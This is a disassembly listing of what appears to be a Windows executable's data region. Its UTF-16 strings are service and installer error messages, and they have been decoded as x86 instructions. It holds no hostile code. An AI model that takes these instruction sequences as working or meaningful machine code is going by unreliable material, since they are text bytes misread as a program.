  4016ec:	imul   eax,DWORD PTR [eax],0x650076
  4016f2:	add    BYTE PTR [eax],al
  4016f4:	das    
  4016f5:	add    BYTE PTR [ecx+0x0],dh
  4016f8:	bound  eax,QWORD PTR [eax]
  4016fa:	and    DWORD PTR [eax],eax
  4016fc:	sub    eax,0x52002000
  401701:	add    BYTE PTR [ebp+0x0],al
  401704:	inc    edx
  401705:	add    BYTE PTR [edi+0x0],cl
  401708:	dec    edi
  401709:	add    BYTE PTR [eax+eax*1+0x50],dl
  40170d:	add    BYTE PTR [edx+0x0],dl
  401710:	dec    edi
  401711:	add    BYTE PTR [ebp+0x0],cl
  401714:	push   eax
  401715:	add    BYTE PTR [eax+eax*1+0x3d],dl
  401719:	add    BYTE PTR [ebx+0x0],dl
  40171c:	add    BYTE PTR [eax],al
  40171e:	add    BYTE PTR [eax],al
  401720:	outs   dx,BYTE PTR ds:[esi]
  401721:	add    BYTE PTR [edi+0x0],ch
  401724:	jb     0x401726
  401726:	add    BYTE PTR gs:[ebx+0x0],dh
  40172a:	je     0x40172c
  40172c:	popa   
  40172d:	add    BYTE PTR [edx+0x0],dh
  401730:	je     0x401732
  401732:	add    BYTE PTR [eax],al
  401734:	push   edx
  401735:	add    BYTE PTR [ebp+0x0],al
  401738:	inc    edx
  401739:	add    BYTE PTR [edi+0x0],cl
  40173c:	dec    edi
  40173d:	add    BYTE PTR [eax+eax*1+0x3d],dl
  401741:	add    BYTE PTR [edx+0x0],dl
  401744:	add    BYTE PTR gs:[ecx+0x0],ah
  401748:	ins    BYTE PTR es:[edi],dx
  401749:	add    BYTE PTR [eax+eax*1+0x79],ch
  40174d:	add    BYTE PTR [ebx+0x0],dl
  401750:	jne    0x401752
  401752:	jo     0x401754
  401754:	jo     0x401756
  401756:	jb     0x401758
  401758:	add    BYTE PTR gs:[ebx+0x0],dh
  40175c:	jae    0x40175e
  40175e:	add    BYTE PTR [eax],al
  401760:	data16 add BYTE PTR [edi+0x0],ch
  401764:	jb     0x401766
  401766:	arpl   WORD PTR [eax],ax
  401768:	add    BYTE PTR gs:[edx+0x0],dh
  40176c:	add    BYTE PTR gs:[ebx+0x0],dh
  401770:	je     0x401772
  401772:	popa   
  401773:	add    BYTE PTR [edx+0x0],dh
  401776:	je     0x401778
  401778:	add    BYTE PTR [eax],al
  40177a:	add    BYTE PTR [eax],al
  40177c:	push   edx
  40177d:	add    BYTE PTR [ebp+0x0],al
  401780:	inc    edx
  401781:	add    BYTE PTR [edi+0x0],cl
  401784:	dec    edi
  401785:	add    BYTE PTR [eax+eax*1+0x3d],dl
  401789:	add    BYTE PTR [esi+0x0],al
  40178c:	outs   dx,DWORD PTR ds:[esi]
  40178d:	add    BYTE PTR [edx+0x0],dh
  401790:	arpl   WORD PTR [eax],ax
  401792:	add    BYTE PTR gs:[eax],al
  401795:	add    BYTE PTR [eax],al
  401797:	add    BYTE PTR [eax+0x0],dh
  40179a:	jb     0x40179c
  40179c:	outs   dx,DWORD PTR ds:[esi]
  40179d:	add    BYTE PTR [ebp+0x0],ch
  4017a0:	jo     0x4017a2
  4017a2:	je     0x4017a4
  4017a4:	jb     0x4017a6
  4017a6:	add    BYTE PTR gs:[ebx+0x0],dh
  4017aa:	je     0x4017ac
  4017ac:	popa   
  4017ad:	add    BYTE PTR [edx+0x0],dh
  4017b0:	je     0x4017b2
  4017b2:	add    BYTE PTR [eax],al
  4017b4:	push   edx
  4017b5:	add    BYTE PTR [ebp+0x0],al
  4017b8:	inc    edx
  4017b9:	add    BYTE PTR [edi+0x0],cl
  4017bc:	dec    edi
  4017bd:	add    BYTE PTR [eax+eax*1+0x50],dl
  4017c1:	add    BYTE PTR [edx+0x0],dl
  4017c4:	dec    edi
  4017c5:	add    BYTE PTR [ebp+0x0],cl
  4017c8:	push   eax
  4017c9:	add    BYTE PTR [eax+eax*1+0x3d],dl
  4017cd:	add    BYTE PTR [edx],ah
  4017cf:	add    BYTE PTR [edx],ah
  4017d1:	add    BYTE PTR [eax],al
  4017d3:	add    BYTE PTR [eax+eax*1+0x6f],ch
  4017d7:	add    BYTE PTR [edi+0x0],ah
  4017da:	add    BYTE PTR [eax],al
  4017dc:	das    
  4017dd:	add    BYTE PTR [eax+eax*1+0x2a],ch
  4017e1:	add    BYTE PTR [eax],al
  4017e3:	add    BYTE PTR [edi],ch
  4017e5:	add    BYTE PTR [eax+0x0],bh
  4017e8:	add    BYTE PTR [eax],al
  4017ea:	add    BYTE PTR [eax],al
  4017ec:	das    
  4017ed:	add    BYTE PTR [eax+0x0],dh
  4017f0:	add    BYTE PTR [eax],al
  4017f2:	add    BYTE PTR [eax],al
  4017f4:	push   eax
  4017f5:	add    BYTE PTR [ecx+0x0],al
  4017f8:	push   esp
  4017f9:	add    BYTE PTR [ebx+0x0],al
  4017fc:	dec    eax
  4017fd:	add    BYTE PTR ds:0x0,bh
  401803:	add    BYTE PTR [ebp+0x0],cl
  401806:	push   ebx
  401807:	add    BYTE PTR [ecx+0x0],cl
  40180a:	push   eax
  40180b:	add    BYTE PTR [ecx+0x0],al
  40180e:	push   esp
  40180f:	add    BYTE PTR [ebx+0x0],al
  401812:	dec    eax
  401813:	add    BYTE PTR [edx+0x0],dl
  401816:	inc    ebp
  401817:	add    BYTE PTR [ebp+0x0],cl
  40181a:	dec    edi
  40181b:	add    BYTE PTR [esi+0x0],dl
  40181e:	inc    ebp
  40181f:	add    BYTE PTR ds:0x69000000,bh
	...
  40182d:	add    BYTE PTR [eax],al
  40182f:	add    BYTE PTR [edi+0x0],cl
  401832:	dec    esp
  401833:	add    BYTE PTR [ebp+0x0],al
  401836:	inc    ecx
  401837:	add    BYTE PTR [ebp+0x0],dl
  40183a:	push   esp
  40183b:	add    BYTE PTR [ebx],dh
  40183d:	add    BYTE PTR [edx],dh
  40183f:	add    BYTE PTR [esi],ch
  401841:	add    BYTE PTR [eax+eax*1+0x6c],ah
  401845:	add    BYTE PTR [eax+eax*1+0x0],ch
  401849:	add    BYTE PTR [eax],al
  40184b:	add    BYTE PTR [eax],al
  40184d:	add    BYTE PTR [eax],al
  40184f:	add    BYTE PTR [ebx+0x0],dl
  401852:	add    BYTE PTR gs:[edx+0x0],dh
  401856:	jbe    0x401858
  401858:	add    BYTE PTR gs:[edx+0x0],dh
  40185c:	dec    ebp
  40185d:	add    BYTE PTR [ecx+0x0],ah
  401860:	imul   eax,DWORD PTR [eax],0x20006e
  401866:	sub    BYTE PTR [eax],al
  401868:	inc    ebx
  401869:	add    BYTE PTR [ecx+0x0],al
  40186c:	sub    DWORD PTR [eax],eax
  40186e:	cmp    al,BYTE PTR [eax]
  401870:	and    BYTE PTR [eax],al
  401872:	dec    edi
  401873:	add    BYTE PTR [eax+0x0],dh
  401876:	add    BYTE PTR gs:[esi+0x0],ch
  40187a:	and    BYTE PTR [eax],al
  40187c:	jae    0x40187e
  40187e:	jns    0x401880
  401880:	outs   dx,BYTE PTR ds:[esi]
  401881:	add    BYTE PTR [ebx+0x0],ah
  401884:	push   0x6f007200
  401889:	add    BYTE PTR [esi+0x0],ch
  40188c:	imul   eax,DWORD PTR [eax],0x61007a
  401892:	je     0x401894
  401894:	imul   eax,DWORD PTR [eax],0x6e006f
  40189a:	and    BYTE PTR [eax],al
  40189c:	add    BYTE PTR gs:[esi+0x0],dh
  4018a0:	add    BYTE PTR gs:[esi+0x0],ch
  4018a4:	je     0x4018a6
  4018a6:	and    BYTE PTR [eax],al
  4018a8:	data16 add BYTE PTR [ecx+0x0],ah
  4018ac:	imul   eax,DWORD PTR [eax],0x65006c
  4018b2:	add    BYTE PTR fs:[eax],al
  4018b5:	add    BYTE PTR [eax],al
  4018b7:	add    BYTE PTR [ebx+0x0],dl
  4018ba:	add    BYTE PTR gs:[edx+0x0],dh
  4018be:	jbe    0x4018c0
  4018c0:	add    BYTE PTR gs:[edx+0x0],dh
  4018c4:	dec    ebp
  4018c5:	add    BYTE PTR [ecx+0x0],ah
  4018c8:	imul   eax,DWORD PTR [eax],0x20006e
  4018ce:	sub    BYTE PTR [eax],al
  4018d0:	inc    ebx
  4018d1:	add    BYTE PTR [ecx+0x0],al
  4018d4:	sub    DWORD PTR [eax],eax
  4018d6:	cmp    al,BYTE PTR [eax]
  4018d8:	and    BYTE PTR [eax],al
  4018da:	push   edi
  4018db:	add    BYTE PTR [ecx+0x0],ah
  4018de:	imul   eax,DWORD PTR [eax],0x200074
  4018e4:	outs   dx,DWORD PTR ds:[esi]
  4018e5:	add    BYTE PTR [esi+0x0],ch
  4018e8:	and    BYTE PTR [eax],al
  4018ea:	jae    0x4018ec
  4018ec:	jns    0x4018ee
  4018ee:	outs   dx,BYTE PTR ds:[esi]
  4018ef:	add    BYTE PTR [ebx+0x0],ah
  4018f2:	push   0x6f007200
  4018f7:	add    BYTE PTR [esi+0x0],ch
  4018fa:	imul   eax,DWORD PTR [eax],0x61007a
  401900:	je     0x401902
  401902:	imul   eax,DWORD PTR [eax],0x6e006f
  401908:	and    BYTE PTR [eax],al
  40190a:	add    BYTE PTR gs:[esi+0x0],dh
  40190e:	add    BYTE PTR gs:[esi+0x0],ch
  401912:	je     0x401914
  401914:	and    BYTE PTR [eax],al
  401916:	data16 add BYTE PTR [ecx+0x0],ah
  40191a:	imul   eax,DWORD PTR [eax],0x65006c
  401920:	add    BYTE PTR fs:[eax],al
  401923:	add    BYTE PTR [eax],al
  401925:	add    BYTE PTR [eax],al
  401927:	add    BYTE PTR [edi+0x0],cl
  40192a:	jo     0x40192c
  40192c:	add    BYTE PTR gs:[esi+0x0],ch
  401930:	push   eax
  401931:	add    BYTE PTR [edx+0x0],dh
  401934:	outs   dx,DWORD PTR ds:[esi]
  401935:	add    BYTE PTR [ebx+0x0],ah
  401938:	add    BYTE PTR gs:[ebx+0x0],dh
  40193c:	jae    0x40193e
  40193e:	push   esp
  40193f:	add    BYTE PTR [edi+0x0],ch
  401942:	imul   eax,DWORD PTR [eax],0x65
  401945:	add    BYTE PTR [esi+0x0],ch
  401948:	and    BYTE PTR [eax],al
  40194a:	data16 add BYTE PTR [ecx+0x0],ah
  40194e:	imul   eax,DWORD PTR [eax],0x65006c
  401954:	add    BYTE PTR fs:[eax],ah
  401957:	add    BYTE PTR [edi+0x0],dh
  40195a:	imul   eax,DWORD PTR [eax],0x680074
  401960:	and    BYTE PTR [eax],al
  401962:	and    eax,0x6400
  401967:	add    BYTE PTR [ebx+0x0],dl
  40196a:	add    BYTE PTR gs:[edx+0x0],dh
  40196e:	jbe    0x401970
  401970:	add    BYTE PTR gs:[edx+0x0],dh
  401974:	dec    ebp
  401975:	add    BYTE PTR [ecx+0x0],ah
  401978:	imul   eax,DWORD PTR [eax],0x20006e
  40197e:	sub    BYTE PTR [eax],al
  401980:	inc    ebx
  401981:	add    BYTE PTR [ecx+0x0],al
  401984:	sub    DWORD PTR [eax],eax
  401986:	cmp    al,BYTE PTR [eax]
  401988:	and    BYTE PTR [eax],al
  40198a:	inc    ebp
  40198b:	add    BYTE PTR [edx+0x0],dh
  40198e:	jb     0x401990
  401990:	outs   dx,DWORD PTR ds:[esi]
  401991:	add    BYTE PTR [edx+0x0],dh
  401994:	cmp    al,BYTE PTR [eax]
  401996:	and    BYTE PTR [eax],al
  401998:	imul   eax,DWORD PTR [eax],0x610063
  40199e:	arpl   WORD PTR [eax],ax
  4019a0:	inc    ebx
  4019a1:	add    BYTE PTR [edi+0x0],ch
  4019a4:	outs   dx,BYTE PTR ds:[esi]
  4019a5:	add    BYTE PTR [eax+eax*1+0x65],dh
  4019a9:	add    BYTE PTR [eax+0x0],bh
  4019ac:	je     0x4019ae
  4019ae:	and    BYTE PTR [eax],al
  4019b0:	imul   eax,DWORD PTR [eax],0x20006e
  4019b6:	inc    ebx
  4019b7:	add    BYTE PTR [ecx+0x0],al
  4019ba:	and    BYTE PTR [eax],al
  4019bc:	jae    0x4019be
  4019be:	add    BYTE PTR gs:[edx+0x0],dh
  4019c2:	jbe    0x4019c4
  4019c4:	add    BYTE PTR gs:[edx+0x0],dh
  4019c8:	and    BYTE PTR [eax],al
  4019ca:	jae    0x4019cc
  4019cc:	push   0x75006f00
  4019d1:	add    BYTE PTR [eax+eax*1+0x64],ch
  4019d5:	add    BYTE PTR [eax],ah
  4019d7:	add    BYTE PTR [edx+0x0],ah
  4019da:	add    BYTE PTR gs:[eax],ah
  4019dd:	add    BYTE PTR [ebp+0x0],al
  4019e0:	inc    ebp
  4019e1:	add    BYTE PTR [ebp+0x0],dl
  4019e4:	dec    ecx
  4019e5:	add    BYTE PTR [eax],ah
  4019e7:	add    BYTE PTR [edx+0x0],ah
  4019ea:	jne    0x4019ec
  4019ec:	je     0x4019ee
  4019ee:	and    BYTE PTR [eax],al
  4019f0:	imul   eax,DWORD PTR [eax],0x200073
  4019f6:	outs   dx,BYTE PTR ds:[esi]
  4019f7:	add    BYTE PTR [edi+0x0],ch
  4019fa:	je     0x4019fc
  4019fc:	and    BYTE PTR [eax],al
  4019fe:	popa   
  4019ff:	add    BYTE PTR [esi+0x0],ch
  401a02:	jns    0x401a04
  401a04:	and    BYTE PTR [eax],al
  401a06:	imul   eax,DWORD PTR [eax],0x70006d
  401a0c:	add    BYTE PTR gs:[edx+0x0],dh
  401a10:	jae    0x401a12
  401a12:	outs   dx,DWORD PTR ds:[esi]
  401a13:	add    BYTE PTR [esi+0x0],ch
  401a16:	popa   
  401a17:	add    BYTE PTR [eax+eax*1+0x65],dh
  401a1b:	add    BYTE PTR [eax+eax*1+0x20],ah
  401a1f:	add    BYTE PTR [eax+eax*1+0x79],dh
  401a23:	add    BYTE PTR [eax+0x0],dh
  401a26:	add    BYTE PTR gs:[eax],al
  401a29:	add    BYTE PTR [eax],al
  401a2b:	add    BYTE PTR [eax],al
  401a2d:	add    BYTE PTR [eax],al
  401a2f:	add    BYTE PTR [ebx+0x0],dl
  401a32:	add    BYTE PTR gs:[edx+0x0],dh
  401a36:	jbe    0x401a38
  401a38:	add    BYTE PTR gs:[edx+0x0],dh
  401a3c:	dec    ebp
  401a3d:	add    BYTE PTR [ecx+0x0],ah
  401a40:	imul   eax,DWORD PTR [eax],0x20006e
  401a46:	sub    BYTE PTR [eax],al
  401a48:	inc    ebx
  401a49:	add    BYTE PTR [ecx+0x0],al
  401a4c:	sub    DWORD PTR [eax],eax
  401a4e:	cmp    al,BYTE PTR [eax]
  401a50:	and    BYTE PTR [eax],al
  401a52:	inc    ebx
  401a53:	add    BYTE PTR [edi+0x0],ch
  401a56:	dec    ecx
  401a57:	add    BYTE PTR [esi+0x0],ch
  401a5a:	imul   eax,DWORD PTR [eax],0x690074
  401a60:	popa   
  401a61:	add    BYTE PTR [eax+eax*1+0x69],ch
  401a65:	add    BYTE PTR [edx+0x0],bh
  401a68:	add    BYTE PTR gs:[ebx+0x0],dl
  401a6c:	add    BYTE PTR gs:[ebx+0x0],ah
  401a70:	jne    0x401a72
  401a72:	jb     0x401a74
  401a74:	imul   eax,DWORD PTR [eax],0x790074
  401a7a:	and    BYTE PTR [eax],al
  401a7c:	data16 add BYTE PTR [ecx+0x0],ah
  401a80:	imul   eax,DWORD PTR [eax],0x65006c
  401a86:	add    BYTE PTR fs:[eax],al
  401a89:	add    BYTE PTR [eax],al
  401a8b:	add    BYTE PTR [eax],al
  401a8d:	add    BYTE PTR [eax],al
  401a8f:	add    BYTE PTR [ebx+0x0],dl
  401a92:	add    BYTE PTR gs:[edx+0x0],dh
  401a96:	jbe    0x401a98
  401a98:	add    BYTE PTR gs:[edx+0x0],dh
  401a9c:	dec    ebp
  401a9d:	add    BYTE PTR [ecx+0x0],ah
  401aa0:	imul   eax,DWORD PTR [eax],0x20006e
  401aa6:	sub    BYTE PTR [eax],al
  401aa8:	inc    ebx
  401aa9:	add    BYTE PTR [ecx+0x0],al
  401aac:	sub    DWORD PTR [eax],eax
  401aae:	cmp    al,BYTE PTR [eax]
  401ab0:	and    BYTE PTR [eax],al
  401ab2:	inc    ebx
  401ab3:	add    BYTE PTR [edi+0x0],ch
  401ab6:	outs   dx,BYTE PTR ds:[esi]
  401ab7:	add    BYTE PTR [esi+0x0],ch
  401aba:	add    BYTE PTR gs:[ebx+0x0],ah
  401abe:	je     0x401ac0
  401ac0:	imul   eax,DWORD PTR [eax],0x6e006f
  401ac6:	and    BYTE PTR [eax],al
  401ac8:	je     0x401aca
  401aca:	outs   dx,DWORD PTR ds:[esi]
  401acb:	add    BYTE PTR [eax],ah
  401acd:	add    BYTE PTR [ebx+0x0],dl
  401ad0:	add    BYTE PTR gs:[edx+0x0],dh
  401ad4:	jbe    0x401ad6
  401ad6:	imul   eax,DWORD PTR [eax],0x650063
  401adc:	and    BYTE PTR [eax],al
  401ade:	data16 add BYTE PTR [ecx+0x0],ah
  401ae2:	imul   eax,DWORD PTR [eax],0x65006c
  401ae8:	add    BYTE PTR fs:[esi],ch
  401aeb:	add    BYTE PTR [eax],al
  401aed:	add    BYTE PTR [eax],al
  401aef:	add    BYTE PTR [ebx+0x0],dl
  401af2:	add    BYTE PTR gs:[edx+0x0],dh
  401af6:	jbe    0x401af8
  401af8:	add    BYTE PTR gs:[edx+0x0],dh
  401afc:	dec    ebp
  401afd:	add    BYTE PTR [ecx+0x0],ah
  401b00:	imul   eax,DWORD PTR [eax],0x20006e
  401b06:	sub    BYTE PTR [eax],al
  401b08:	inc    ebx
  401b09:	add    BYTE PTR [ecx+0x0],al
  401b0c:	sub    DWORD PTR [eax],eax
  401b0e:	cmp    al,BYTE PTR [eax]
  401b10:	and    BYTE PTR [eax],al
  401b12:	push   eax
  401b13:	add    BYTE PTR [edx+0x0],dh
  401b16:	outs   dx,DWORD PTR ds:[esi]
  401b17:	add    BYTE PTR [ebx+0x0],ah
  401b1a:	add    BYTE PTR gs:[ebx+0x0],dh
  401b1e:	jae    0x401b20
  401b20:	and    BYTE PTR [eax],al
  401b22:	outs   dx,BYTE PTR ds:[esi]
  401b23:	add    BYTE PTR [edi+0x0],ch
  401b26:	je     0x401b28
  401b28:	and    BYTE PTR [eax],al
  401b2a:	jb     0x401b2c
  401b2c:	add    BYTE PTR gs:[edi+0x0],ah
  401b30:	imul   eax,DWORD PTR [eax],0x740073
  401b36:	add    BYTE PTR gs:[edx+0x0],dh
  401b3a:	add    BYTE PTR gs:[eax+eax*1+0x20],ah
  401b3f:	add    BYTE PTR [edi+0x0],dh
  401b42:	imul   eax,DWORD PTR [eax],0x680074
  401b48:	and    BYTE PTR [eax],al
  401b4a:	jae    0x401b4c
  401b4c:	add    BYTE PTR gs:[edx+0x0],dh
  401b50:	jbe    0x401b52
  401b52:	imul   eax,DWORD PTR [eax],0x650063
  401b58:	add    BYTE PTR cs:[eax],al
  401b5b:	add    BYTE PTR [eax],al
  401b5d:	add    BYTE PTR [eax],al
  401b5f:	add    BYTE PTR [ebx+0x0],dl
  401b62:	add    BYTE PTR gs:[edx+0x0],dh
  401b66:	jbe    0x401b68
  401b68:	add    BYTE PTR gs:[edx+0x0],dh
  401b6c:	dec    ebp
  401b6d:	add    BYTE PTR [ecx+0x0],ah
  401b70:	imul   eax,DWORD PTR [eax],0x20006e
  401b76:	sub    BYTE PTR [eax],al
  401b78:	inc    ebx
  401b79:	add    BYTE PTR [ecx+0x0],al
  401b7c:	sub    DWORD PTR [eax],eax
  401b7e:	cmp    al,BYTE PTR [eax]
  401b80:	and    BYTE PTR [eax],al
  401b82:	inc    ebx
  401b83:	add    BYTE PTR [edi+0x0],ch
  401b86:	jne    0x401b88
  401b88:	ins    BYTE PTR es:[edi],dx
  401b89:	add    BYTE PTR [eax+eax*1+0x20],ah
  401b8d:	add    BYTE PTR [esi+0x0],ch
  401b90:	outs   dx,DWORD PTR ds:[esi]
  401b91:	add    BYTE PTR [eax+eax*1+0x20],dh
  401b95:	add    BYTE PTR [edi+0x0],ch
  401b98:	jo     0x401b9a
  401b9a:	add    BYTE PTR gs:[esi+0x0],ch
  401b9e:	and    BYTE PTR [eax],al
  401ba0:	jae    0x401ba2
  401ba2:	jns    0x401ba4
  401ba4:	outs   dx,BYTE PTR ds:[esi]
  401ba5:	add    BYTE PTR [ebx+0x0],ah
  401ba8:	push   0x6f007200
  401bad:	add    BYTE PTR [esi+0x0],ch
  401bb0:	imul   eax,DWORD PTR [eax],0x61007a
  401bb6:	je     0x401bb8
  401bb8:	imul   eax,DWORD PTR [eax],0x6e006f
  401bbe:	and    BYTE PTR [eax],al
  401bc0:	push   0x6e006100
  401bc5:	add    BYTE PTR [eax+eax*1+0x6c],ah
  401bc9:	add    BYTE PTR [ebp+0x0],ah
  401bcc:	add    BYTE PTR cs:[eax],al
  401bcf:	add    BYTE PTR [ebx+0x0],dl
  401bd2:	add    BYTE PTR gs:[edx+0x0],dh
  401bd6:	jbe    0x401bd8
  401bd8:	add    BYTE PTR gs:[edx+0x0],dh
  401bdc:	dec    ebp
  401bdd:	add    BYTE PTR [ecx+0x0],ah
  401be0:	imul   eax,DWORD PTR [eax],0x20006e
  401be6:	sub    BYTE PTR [eax],al
  401be8:	inc    ebx
  401be9:	add    BYTE PTR [ecx+0x0],al
  401bec:	sub    DWORD PTR [eax],eax
  401bee:	cmp    al,BYTE PTR [eax]
  401bf0:	and    BYTE PTR [eax],al
  401bf2:	dec    ecx
  401bf3:	add    BYTE PTR [ebp+0x0],ch
  401bf6:	jo     0x401bf8
  401bf8:	add    BYTE PTR gs:[edx+0x0],dh
  401bfc:	jae    0x401bfe
  401bfe:	outs   dx,DWORD PTR ds:[esi]
  401bff:	add    BYTE PTR [esi+0x0],ch
  401c02:	popa   
  401c03:	add    BYTE PTR [eax+eax*1+0x69],dh
  401c07:	add    BYTE PTR [edi+0x0],ch
  401c0a:	outs   dx,BYTE PTR ds:[esi]
  401c0b:	add    BYTE PTR [eax],ah
  401c0d:	add    BYTE PTR [eax+eax*1+0x6f],dh
  401c11:	add    BYTE PTR [ebx+0x0],ch
  401c14:	add    BYTE PTR gs:[esi+0x0],ch
  401c18:	and    BYTE PTR [eax],al
  401c1a:	outs   dx,BYTE PTR ds:[esi]
  401c1b:	add    BYTE PTR [edi+0x0],ch
  401c1e:	je     0x401c20
  401c20:	and    BYTE PTR [eax],al
  401c22:	jae    0x401c24
  401c24:	popa   
  401c25:	add    BYTE PTR [esi+0x0],dh
  401c28:	add    BYTE PTR gs:[eax+eax*1+0x2e],ah
  401c2d:	add    BYTE PTR [eax],al
  401c2f:	add    BYTE PTR [ebx+0x0],dl
  401c32:	je     0x401c34
  401c34:	popa   
  401c35:	add    BYTE PTR [edx+0x0],dh
  401c38:	je     0x401c3a
  401c3a:	push   ebx
  401c3b:	add    BYTE PTR [ebp+0x0],ah
  401c3e:	jb     0x401c40
  401c40:	jbe    0x401c42
  401c42:	imul   eax,DWORD PTR [eax],0x650063
  401c48:	inc    ebx
  401c49:	add    BYTE PTR [eax+eax*1+0x72],dh
  401c4d:	add    BYTE PTR [eax+eax*1+0x44],ch
  401c51:	add    BYTE PTR [ecx+0x0],ch
  401c54:	jae    0x401c56
  401c56:	jo     0x401c58
  401c58:	popa   
  401c59:	add    BYTE PTR [eax+eax*1+0x63],dh
  401c5d:	add    BYTE PTR [eax+0x0],ch
  401c60:	add    BYTE PTR gs:[edx+0x0],dh
  401c64:	and    BYTE PTR [eax],al
  401c66:	data16 add BYTE PTR [ecx+0x0],ah
  401c6a:	imul   eax,DWORD PTR [eax],0x65006c
  401c70:	add    BYTE PTR fs:[esi],ch
  401c73:	add    BYTE PTR [eax],al
  401c75:	add    BYTE PTR [eax],al
  401c77:	add    BYTE PTR [ebx+0x0],al
  401c7a:	dec    esp
  401c7b:	add    BYTE PTR [ebx+0x0],dl
  401c7e:	dec    ecx
  401c7f:	add    BYTE PTR [eax+eax*1+0x0],al
  401c83:	add    BYTE PTR [eax],al
  401c85:	add    BYTE PTR [eax],al
  401c87:	add    BYTE PTR [ebx+0x0],dl
  401c8a:	add    BYTE PTR gs:[edx+0x0],dh
  401c8e:	jbe    0x401c90
  401c90:	imul   eax,DWORD PTR [eax],0x650063
  401c96:	push   esp
  401c97:	add    BYTE PTR [eax+0x0],ch
  401c9a:	jb     0x401c9c
  401c9c:	add    BYTE PTR gs:[ecx+0x0],ah
  401ca0:	add    BYTE PTR fs:[ebp+0x0],cl
  401ca4:	popa   
  401ca5:	add    BYTE PTR [ecx+0x0],ch
  401ca8:	outs   dx,BYTE PTR ds:[esi]
  401ca9:	add    BYTE PTR [edx],bh
  401cab:	add    BYTE PTR [eax],ah
  401cad:	add    BYTE PTR [ebx+0x0],al
  401cb0:	outs   dx,DWORD PTR ds:[esi]
  401cb1:	add    BYTE PTR [ecx+0x0],cl
  401cb4:	outs   dx,BYTE PTR ds:[esi]
  401cb5:	add    BYTE PTR [ecx+0x0],ch
  401cb8:	je     0x401cba
  401cba:	imul   eax,DWORD PTR [eax],0x6c0061
  401cc0:	imul   eax,DWORD PTR [eax],0x65007a
  401cc6:	push   ebx
  401cc7:	add    BYTE PTR [ebp+0x0],ah
  401cca:	arpl   WORD PTR [eax],ax
  401ccc:	jne    0x401cce
  401cce:	jb     0x401cd0
  401cd0:	imul   eax,DWORD PTR [eax],0x790074
  401cd6:	and    BYTE PTR [eax],al
  401cd8:	data16 add BYTE PTR [ecx+0x0],ah
  401cdc:	imul   eax,DWORD PTR [eax],0x65006c
  401ce2:	add    BYTE PTR fs:[eax],al
  401ce5:	add    BYTE PTR [eax],al
  401ce7:	add    BYTE PTR [ebx+0x0],dl
  401cea:	add    BYTE PTR gs:[edx+0x0],dh
  401cee:	jbe    0x401cf0
  401cf0:	imul   eax,DWORD PTR [eax],0x650063
  401cf6:	push   esp
  401cf7:	add    BYTE PTR [eax+0x0],ch
  401cfa:	jb     0x401cfc
  401cfc:	add    BYTE PTR gs:[ecx+0x0],ah
  401d00:	add    BYTE PTR fs:[ebp+0x0],cl
  401d04:	popa   
  401d05:	add    BYTE PTR [ecx+0x0],ch
  401d08:	outs   dx,BYTE PTR ds:[esi]
  401d09:	add    BYTE PTR [edx],bh
  401d0b:	add    BYTE PTR [eax],ah
  401d0d:	add    BYTE PTR [ebx+0x0],al
  401d10:	jb     0x401d12
  401d12:	add    BYTE PTR gs:[ecx+0x0],ah
  401d16:	je     0x401d18
  401d18:	add    BYTE PTR gs:[ebx+0x0],dl
  401d1c:	inc    esp
  401d1d:	add    BYTE PTR [eax],ah
  401d1f:	add    BYTE PTR [esi+0x0],ah
  401d22:	outs   dx,DWORD PTR ds:[esi]
  401d23:	add    BYTE PTR [edx+0x0],dh
  401d26:	and    BYTE PTR [eax],al
  401d28:	inc    ebx
  401d29:	add    BYTE PTR [edx+0x0],dh
  401d2c:	add    BYTE PTR gs:[ecx+0x0],ah
  401d30:	je     0x401d32
  401d32:	add    BYTE PTR gs:[edi+0x0],dl
  401d36:	popa   
  401d37:	add    BYTE PTR [ecx+0x0],ch
  401d3a:	je     0x401d3c
  401d3c:	popa   
  401d3d:	add    BYTE PTR [edx+0x0],ah
  401d40:	ins    BYTE PTR es:[edi],dx
  401d41:	add    BYTE PTR [ebp+0x0],ah
  401d44:	push   esp
  401d45:	add    BYTE PTR [ecx+0x0],ch
  401d48:	ins    DWORD PTR es:[edi],dx
  401d49:	add    BYTE PTR [ebp+0x0],ah
  401d4c:	jb     0x401d4e
  401d4e:	and    BYTE PTR [eax],al
  401d50:	data16 add BYTE PTR [ecx+0x0],ah
  401d54:	imul   eax,DWORD PTR [eax],0x65006c
  401d5a:	add    BYTE PTR fs:[esi],ch
  401d5d:	add    BYTE PTR [eax],al
  401d5f:	add    BYTE PTR [ebx+0x0],dl
  401d62:	add    BYTE PTR gs:[edx+0x0],dh
  401d66:	jbe    0x401d68
  401d68:	imul   eax,DWORD PTR [eax],0x650063
  401d6e:	push   esp
  401d6f:	add    BYTE PTR [eax+0x0],ch
  401d72:	jb     0x401d74
  401d74:	add    BYTE PTR gs:[ecx+0x0],ah
  401d78:	add    BYTE PTR fs:[ebp+0x0],cl
  401d7c:	popa   
  401d7d:	add    BYTE PTR [ecx+0x0],ch
  401d80:	outs   dx,BYTE PTR ds:[esi]
  401d81:	add    BYTE PTR [edx],bh
  401d83:	add    BYTE PTR [eax],ah
  401d85:	add    BYTE PTR [ebx+0x0],al
  401d88:	jb     0x401d8a
  401d8a:	add    BYTE PTR gs:[ecx+0x0],ah
  401d8e:	je     0x401d90
  401d90:	add    BYTE PTR gs:[ebp+0x0],al
  401d94:	jbe    0x401d96
  401d96:	add    BYTE PTR gs:[esi+0x0],ch
  401d9a:	je     0x401d9c
  401d9c:	and    BYTE PTR [eax],al
  401d9e:	data16 add BYTE PTR [ecx+0x0],ah
  401da2:	imul   eax,DWORD PTR [eax],0x65006c
  401da8:	add    BYTE PTR fs:[esi],ch
  401dab:	add    BYTE PTR [eax],al
  401dad:	add    BYTE PTR [eax],al
  401daf:	add    BYTE PTR [ebx+0x0],dl
  401db2:	add    BYTE PTR gs:[edx+0x0],dh
  401db6:	jbe    0x401db8
  401db8:	imul   eax,DWORD PTR [eax],0x650063
  401dbe:	push   esp
  401dbf:	add    BYTE PTR [eax+0x0],ch
  401dc2:	jb     0x401dc4
  401dc4:	add    BYTE PTR gs:[ecx+0x0],ah
  401dc8:	add    BYTE PTR fs:[ebp+0x0],cl
  401dcc:	popa   
  401dcd:	add    BYTE PTR [ecx+0x0],ch
  401dd0:	outs   dx,BYTE PTR ds:[esi]
  401dd1:	add    BYTE PTR [edx],bh
  401dd3:	add    BYTE PTR [eax],ah
  401dd5:	add    BYTE PTR [ebx+0x0],al
  401dd8:	jb     0x401dda
  401dda:	add    BYTE PTR gs:[ecx+0x0],ah
  401dde:	je     0x401de0
  401de0:	add    BYTE PTR gs:[edi+0x0],dl
  401de4:	popa   
